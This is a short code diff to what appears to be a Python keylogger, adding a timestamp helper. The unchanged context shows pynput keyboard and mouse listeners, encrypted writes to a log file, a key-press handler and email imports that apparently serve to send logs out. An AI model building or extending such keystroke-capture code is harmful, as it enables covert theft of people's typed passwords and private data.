@@ -1,6 +1,5 @@
 # My resources
 from constants import *
-from utils import *
 
 # Site-packages
 from playsound import playsound
@@ -8,6 +7,7 @@ from pynput.keyboard import Listener as Keyboard_listener, Key
 from pynput.mouse import Listener as Mouse_listener, Button
 
 # stdlibs
+from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from os.path import join
@@ -21,6 +21,14 @@ def write_to_log(s: str) -> None:
     Write encrypted data to the log file.
     """
     dump(fernet.encrypt(s.encode("utf-8")), log_f)
+
+
+def get_time(day=False) -> str:
+    """
+    Get local time on computer
+    """
+    format_ = "%d %b %H:%M:%S" if day else "%H:%M:%S"
+    return datetime.now().strftime(format_)
 
 
 def keyboard_press(key: Key) -> None:
